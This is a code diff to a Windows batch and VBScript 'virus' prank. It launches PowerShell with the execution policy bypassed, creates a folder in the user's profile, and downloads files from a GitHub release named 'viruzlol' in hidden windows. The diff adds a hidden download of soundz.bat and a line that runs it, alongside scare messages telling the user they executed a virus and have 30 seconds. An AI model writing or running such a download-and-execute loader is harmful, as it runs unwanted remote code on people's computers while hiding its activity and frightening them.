@@ -1,6 +1,6 @@
 @echo off
 start /min Powershell -ExecutionPolicy bypass
-start /min soundz.bat
+
 echo Loading...
 setlocal
 setlocal EnableDelayedExpansion
@@ -35,7 +35,9 @@ IF EXIST "%USERPROFILE%\beanslmao\" del /Q "%USERPROFILE%\beanslmao\"
 IF NOT EXIST "%USERPROFILE%\beanslmao\" mkdir "%USERPROFILE%\beanslmao\" 
 
 rem timeout 1 > NUL
-powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/xxxMEMESCOEPxxx/viruzlol/releases/download/lol/lol.zip -OutFile %USERPROFILE%\beanslmao\package.zip
+powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/MEMESCOEP/viruzlol/releases/download/lol/lol.zip -OutFile %USERPROFILE%\beanslmao\package.zip
+powershell -windowstyle hidden -command Invoke-WebRequest https://github.com/MEMESCOEP/viruzlol/releases/download/lol/soundz.bat -OutFile %USERPROFILE%\beanslmao\soundz.bat
+
 rem powershell -Command "(New-Object Net.WebClient).DownloadFile('https://github.com/xxxMEMESCOEPxxx/viruzlol/releases/download/lol/lol.zip', '%TEMP%\beanslmao\package.zip')"
 
 
@@ -98,6 +100,7 @@ strHomeFolder = oShell.ExpandEnvironmentStrings("%USERPROFILE%")
 'X=MsgBox("Congratulations, You just executed a virus! Do not close any windows, or your computer will be destroyed.", 4096+16, "VIRuS ALErT")
 X=MsgBox("You have 30 seconds.", 0+48, "Warning")
 CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\lmaogif.bat"
+CreateObject("WScript.Shell").Run strHomeFolder + "\beanslmao\soundz.bat"
 
 WScript.Sleep(30000)
 
